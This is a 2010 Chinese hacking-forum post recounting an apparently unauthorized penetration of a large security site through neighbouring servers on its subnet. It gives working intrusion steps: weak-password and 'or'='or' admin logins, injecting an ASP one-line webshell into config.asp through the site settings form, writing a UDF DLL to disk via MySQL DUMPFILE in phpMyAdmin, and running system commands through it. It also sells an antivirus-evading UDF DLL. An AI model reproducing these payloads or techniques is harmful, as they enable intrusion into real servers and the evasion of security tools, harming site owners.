@@ -1,0 +1,243 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+网络渗透中的一些细节和技巧
+D8888D主贴内容-------------------------------------------------------
+ 
+
+网络渗透中的一些细节和技巧
+
+(前面一部分是提交申请时的，
+后面做了一些补充 关于在phpmyadmin里UDF提权的一些细节)
+
+
+这两天正在渗透某一大型的安全类站点，中间比较累，但确实收获颇
+多。差不多一年多了，一直在忙工作 就没怎么接触计算机技术方面的知
+识了。这次算是温习吧，也许没什么技术含量，不过我觉得我在渗透过程
+中的思路以及分析方法 对刚开始学习以及兴趣正开始浓厚的朋友来说还是
+比较有帮助的。
+    言归正传。这个大型站点历年来被不少人渗透过，安全方面做得相当
+完善了。渗透的思路要么就是旁注，要么就是攻陷C段服务器嗅探。因为
+独立域名服务器，那么就只有从C段下手了。
+    用iisputscaner扫描有IIS写权限漏洞的服务器。IP地址从*.*.*.1-
+*.*.*.255 发现目标机器中只有一台可以利用，随后拿到webshell,当我费
+尽千心万苦提权拿到3389后，发现这台服务器跟目标不是一个网段，郁闷
+之极。于是从*.*.*.126-*.*.*.255  中间用iisputscaner扫描开放web
+服务的机器。
+    对于80端口渗透我是这样做的:
+       1、首先在url后面加admin回车，看是否能进入后台管理界面，然后
+尝试弱口令admin:admin或admin:admin888或admin:123456能否登录
+，实践证明不少后台都这样进去；还可以尝试'or'='or'等注入漏洞的方式
+登录。
+     2、还可以再url后面加login.asp,login.php等去尝试找后台，如果
+无法登录后台，或者后台地址根本找不到，那么我们可以尝试去寻找这个
+网站用的是哪套WEB系统。有的站点页面最下方直接就标准出来了，有的
+在后台登录界面有，有的根本无法很直接的判断出是什么系统。这个时候
+可以找这个网站比较有点特的URL地址，比如某站点地址有admin/previlege
+/login.asp;然后googel搜索，inurl:admin/previlege/login.asp;这样就
+能找到不少这样的站点，看看其他站点是否标注了哪套WEB系统。当我们
+知道了站点的系统后就可以搜索这套系统被公布的漏洞，0day,exp然后就可以较快的
+有目的性的进行渗透。不然就只有慢慢尝试去寻找注入点，或者寻找上传漏洞，比较费时间。
+    根据以上思想我花了一些时间看了好几个机器终于利用某系统新出的漏洞拿到了shell，
+然后PHP SHELL执行DOS命令竟然直接就可以添加系统账户。然后上传udf.php ，
+这个是提权用的，不过我发现他开3389功能不错，给这台机器开了3389。因为之前我用注册表
+导入的方式 未能成功开通 ，花了很久没弄明白原因。
+    这个时候心情比较愉悦，因为可以对我的目标机器进行嗅探了。但万万让我很郁闷的事又发生了，
+我再次ping那个大型的安全站点时发现它的IP地址完全改变了，完全不是我一开始PING出来的那个地址了。
+顿时 心情跌入低谷。
+    这个时候我想要么它是动态IP？真不知道 怎么继续了。于是就暂停去休息。第二天继续PING目标，
+结果目标还是后面这个IP  ，不管了继续从这个IP的C段入手，再找台机器 还是按上面的思路，最终嗅探目标。
+    不过后面进行的C段渗透比较艰难了，我机会1-255开放WEB的站点都看了，几乎没有哪个站点可以很快的
+拿到SHELL ，于是昨天晚上用XSCAN出来扫一圈，发现如下：
+1、有几台FTP弱口令，但没任何权限
+2、有台FTP弱口令，可以上传文件，但不是WEB目录；FTP也没执行命令权限；
+3、有台SQL若口令，同样没任何权限
+心中无比凄凉。
+    这个时候发现了一个服务器一个站点时cms3.0.0但搜索了公布的漏洞 都无法成功利用，同时还有套WEB系统，
+放的是某**站点是ASP系统结构。直接点 管理 进入后台登录界面 尝试了几次 最后以admin:123456登入后台。
+后台我是翻来覆去的到处看，始终没找到利用的地方。在后台 我的思路如下：
+1、尝试找到这是哪套系统。后台，管理界面都无法直接看出。只是在登录界面看源码时看到是**学校管理系统9正式版。
+于是搜索该系统可能被公布的漏洞，但一无所获，也许这个系统比较冷僻 关注的人很少。
+2、找上传的地方，看是否有上传漏洞。我在文章编辑里找到有上传的类型还挺多 还后HTML型。可是无论我用抓包 
+修改文件名方式以及1.asp;.jpg方式漏洞都无法成功，并且上传后系统自动重新命名。看来无法利用上传漏洞。
+3、有个数据库备份 只是备份只能以MDB后缀，而且我点备份似乎看起来它并没有备份可能系统有些问题。
+4、尝试把该套系统下载下来，在自己机器上看看，会不会有什么可以渗透进去的地方。我还是看的上传页面 
+看看是否能绕过去格式限制。
+       代码下载后 在本机架设好，上传页面UploadFaceOK.asp
+有限制代码如下：
+Const UpFileType="png|gif|jpg|bmp"        '允许的上传文件类型
+...
+..
+if file.filesize>(MaxFileSize*1024) then
+                        msg="文件大小超过了限制，最大只能上传" & CStr(MaxFileSize) & "K的文件！"
+                        founderr=true
+                end if
+
+                fileExt=lcase(file.FileExt)
+                Forumupload=split(UpFileType,"|")
+                for i=0 to ubound(Forumupload)
+                        if fileEXT=trim(Forumupload(i)) then
+                                EnableUpload=true
+                                exit for
+                        end if
+                next
+                if fileEXT="asp" or fileEXT="asa" or fileEXT="aspx" or fileEXT="cer" or fileEXT="cdx" then
+                        EnableUpload=false
+                end if
+                if EnableUpload=false then
+                        msg="这种文件类型不允许上传！\n\n只允许上传这几种文件类型：" & UpFileType
+                        founderr=true
+                end if
+先判断是否在已有的允许的类型里，如果不是 就直接返回错误；然后再过滤一道，后面这道觉得有点多余。
+这套系统共有6个上传页面，只是每个都这样的限制，看起来无法绕过了。
+这时发现这个页面顶端 有句 ：<!--#include file="Inc/upload.asp"-->
+然后就看看upload.asp，结果看到就是一个 无组件上传类  。 只是在INC这个目录下 还有个config.asp就顺便看看
+<%
+Const MaxFileSize="100000"        '上传文件大小限制
+Const SaveUpFilesPath="UploadFile"                        '存放上传文件的目录
+Const UpFileType="jpg|gif|png"        '允许的上传文件类型
+Const byteType=""        '留言本过滤词语         //
+Const byteipType=""        '网站恶意ＩＰ地址留言屏蔽
+Const bytezfType=""        '网站恶意广告留言字符屏蔽
+Const newsipType=""        '浏览文章IP限制设置(填写为允许、发文需要相应设置)
+................
+.......
+%>
+顿时眼前一亮 发现在哪里见过，对了，就是在后台管理界面 网站属性设置里 有这些内容，记得当时 
+我在上传类型里添加了asp类型，添加成功了但是就是还无法上传。
+    这时我想到的时 修改网站属性的同时 就是把config.asp 的内容给改了。那么我是不是可以吧一句话木马写进去？
+于是就赶紧尝试，直接 在 允许上传类型后面加一句话木马。这时我再打开config.asp发现内容 如下：
+Const UpFileType="jpg|gif|png<%execute(request("3"))%>"        '允许的上传文件类型
+看起来写入成功了，然后马上拿客户端连接 提交 结果 失败。
+
+因为没去学过asp编程，所以有点摸不着头脑，但想想 会不会是 前后 < >这些符号没关闭好？
+然后尝试  修改 config.asp  如下 ：
+Const UpFileType="jpg|gif|png"%> <%execute(request("3"))%> <% ' "        '允许的上传文件类型
+这样 我把类型后面接一个%>把前面的闭合好，然后 插入一句话木马  然后 加<% 后asp文件最后的%>对应 
+后面  接 ' 是吧 最后原有的"给注释掉，
+这样就大功告成了吧。 
+于是我先在自己系统搭建环境 进入后台 在类型后面 输入"%> <%execute(request("3"))%> <% '  如下图
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1009/1009281452082b5d166521d465.png[/img][url=http://www.t00ls.net/attachment.php?aid=OTMzMHxhYTQ3YmY1M3wxMjg2NDc2Nzg2fGUyOWF3UUhRZkZ6bUdVYlNCZmR5b3JUSk9GYzlCcHUxNWtoUUo5TWVZQ2VvZG5r&nothumb=yes]链接标记下载[/url] (25 KB)
+
+2010-9-28 14:52
+提交，然后 再看看config.asp文件：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1009/100928145298454bc18451b6b6.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTMzMXw3MzNiOGYyYXwxMjg2NDc2Nzg2fGUyOWF3UUhRZkZ6bUdVYlNCZmR5b3JUSk9GYzlCcHUxNWtoUUo5TWVZQ2VvZG5r&nothumb=yes]链接标记下载[/url] (45.26 KB)
+
+2010-9-28 14:52
+然后尝试连接一句话 shell   在 inc/config.asp
+
+
+
+嘿嘿 ！果然拿一句话木马客户端提交 成功得到shell。
+后来发现不少 asp后台 都有网站配置 这一项 并且 一般都是往config.asp里写数据
+那么我们就可以利用这个特点写入一句话木马 从而得到shell。
+在实际渗透过程中 可以尝试在 data 或inc等目录 尝试访问config.asp如果可以找到 那么在后台写入shell。 
+得到了后台shell后 发现没什么权限，这时我用wwwscan扫描下 web目录看看有没有什么又用的东西。发现 可以不用密码 直接登录phpmyadmin后台，一开始在后台翻来翻去找不到什么又用的东西，找到php后台数据库mysql密文密码 也无法解密。试图用数据库语句 into outfile 写入一句话shell 但又不知道物理录井，尝试了网上公布的所有暴路径的方式 都无法得到物理录井，自己也尝试对一些目录 loadfile 还是没得到物理录井。
+后面想到udf提权就找了找这方面的资料：
+《Windows环境下通过MySQL以SYSTEM身份执行系统命令》
+[url=http://www.cnxhacker.com/Article/hacker/study/200505/4906.html]链接标记http://www.cnxhacker.com/Article/hacker/study/200505/4906.html[/url]
+《利用mysql上传和执行文件》
+[url=http://www.fish888.com/mysql-t112940]链接标记http://www.fish888.com/mysql-t112940[/url]
+《MYSQL中的UDF – Can’t open shared library 的研究》
+[url=http://xiaoyi.us/archives/42]链接标记http://xiaoyi.us/archives/42[/url]
+
+主要有两点思想：
+
+第一：可以通过MySQL上传二进制文件，例如自己编写的UDF DLL；
+第二：可以通过注册UDF DLL中自写的Function而执行任意命令。
+
+
+首先尝试:
+Create TABLE a (cmd text NOT NULL); 
+Insert INTO a (cmd) VALUES('<%execute(request("3"))%>'); 
+select cmd from a into outfile “c:\\test.txt” 
+Drop TABLE IF EXISTS a;
+
+然后select load_file(‘c:test.txt’) 发现 写入test.txt 成功。
+这个给了我极大的信心提权。
+下面就尝试 把udf.dll以二进制格式写入c:\\windows\\目录下。
+
+按照上面资料里描述的 用以下语句：
+DROP TABLE IF EXISTS mix;
+create table mix(data LONGBLOB);
+set @a=(0x4d5a4B45524E454C33322E444C4C00004C6F61644C696272617279410000000047657450726F63416464726573730000557061636B42794477696E6740000000504500004C010);                                
+INSERT into mix values ("");
+update Mix set data=@a;
+SELECT data FROM mix INTO DUMPFILE "c:\\ud.dll";
+drop table mix;
+select load_file("c:\\ud.dll");
+结果发现有问题 如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1009/100928145299cdb044e0455da1.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTMzMnwzZWVmNjQ5ZHwxMjg2NDc2Nzg2fGUyOWF3UUhRZkZ6bUdVYlNCZmR5b3JUSk9GYzlCcHUxNWtoUUo5TWVZQ2VvZG5r&nothumb=yes]链接标记下载[/url] (13.57 KB)
+
+2010-9-28 14:52
+
+发现了连个问提
+1、就像前面资料里描述的一样生成的dll文件 首部多了半字节的0,比如我们提交的4d  5a直接变成了04 d5 a4……..。
+2、提交的二进制数据里的000  都变成了\0\0\0.感觉很奇怪。
+
+然后在本地 打开phpmyadmin也是这个效果，不知何故。
+这时 试试看phpmyadmin里的import功能是否能 把文件传进去，心里多半感觉行不通，网上没人这么讲过，新建一个表，然后清空，再点ipmport如图：
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1009/10092814524dcffbf4aec04ccc.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTMzM3wwMjgyNGI2Y3wxMjg2NDc2Nzg2fGUyOWF3UUhRZkZ6bUdVYlNCZmR5b3JUSk9GYzlCcHUxNWtoUUo5TWVZQ2VvZG5r&nothumb=yes]链接标记下载[/url] (30.83 KB)
+
+2010-9-28 14:52
+
+文本位置选择保存了UDF.DLL二进制数据的文本文件。  字符集选择binary表示二进制 然后点执行。
+
+成功执行：INSERT INTO `mysql`.`mix` (`data`) VALUES （0x4d5a4B4……）
+
+这表示我们把 mix表里写入了udf的二进制。
+然后执行 SELECT data FROM mix INTO DUMPFILE "c:\\udf.dll";
+再load_file查看 结果发现 上面的问题1 不存在了  生成的文件不会多出半个字节的0，但是文件里的0000 仍然为\0\0\0…。
+
+然后 直接尝试INSERT INTO `mysql`.`mix` (`data`) VALUES（0x45…）
+最后一切正常。
+
+实践证明在phpmyadmin里 如果 INSERT INTO `mysql`.`mix` (`data`) VALUES （0x45……….）
+换成了 INSERT into mix values (@a);
+那么 就会出错 ，最终生成的文件多出半字节0。通过变量赋值会让0字节转化成\0。
+
+
+
+最后自己构造mysql数据库命令如下：
+
+DROP TABLE IF EXISTS mix;
+create table mix(data LONGBLOB);
+INSERT INTO `mysql`.`mix` (`data`) VALUES（0x45…………..）（二进制数据省略）
+SELECT data FROM mix INTO DUMPFILE "c:\\udf.dll";
+drop table mix;
+
+
+这个时候loadfile发现 0000 也不再解析成\0了 ，成功将 二进制文件udf.dll上传到 服务器c盘目录下。
+
+总结如下：
+1、        在phpmyadmin里 如果表名前不带数据库名 会在生成的文件前多出半字节0。
+2、        如果通过变量赋值 然后将变量插入表中 那么最后生成的文件里0字节 会变成\0。
+
+
+最后终于 成功上传了udf.dll，但是在执行
+CREATE FUNCTION cmdshell RETURNS STRING SONAME 'C:udf.dll'
+时提示无法共享库，重新上传又提示文件已经存在。 我猜想一定时被杀毒软件拦截了。
+于是从网上找了好几个版本的 都不行。最后 找到源代码 自己编译 把其他的功能都去掉，只留下cmdshell()函数。并且把cmdshell()函数改名 为windcmd()。
+然后执行 CREATE FUNCTION windcmd RETURNS STRING SONAME 'C:udf.dll'
+接着：
+Select windcmd(“net user”)
+返回如下图： 
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1009/10092814525c70a0f37c12cb84.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTMyOXwzZDhmMWJlYXwxMjg2NDc2Nzg2fGUyOWF3UUhRZkZ6bUdVYlNCZmR5b3JUSk9GYzlCcHUxNWtoUUo5TWVZQ2VvZG5r&nothumb=yes]链接标记下载[/url] (18.12 KB)
+
+2010-9-28 14:52
+服务器开了3389，到此拿下了这台服务器权限！
+
+现在就到此了，后面如果有新内容 我会接着补充!
+
+文字功底差 可能很多地方表达的不好  总之希望 能对新手 有帮助吧！共同交流共同进步。
+
+最后附上 重新编译得到的免杀的udf.dll 里面只保留了一个函数windcmd() 可以执行dos命令。
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img]收费附件: udf免杀.rar 
+
+因为太穷 希望有钱的捧个钱场！ （改成 1金币了，有条件的下吧，可以自行加壳！）
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img][url=http://www.t00ls.net/misc.php?action=attachpay&aid=9334]链接标记udf免杀.rar[/url] (21.45 KB) 下载次数:5
+2010-9-28 15:01
+
+售价: 金钱 1  [[url=http://www.t00ls.net/misc.php?action=viewattachpayments&aid=9334]链接标记记录[/url]]  [[url=http://www.t00ls.net/misc.php?action=attachpay&aid=9334]链接标记购买[/url]] 
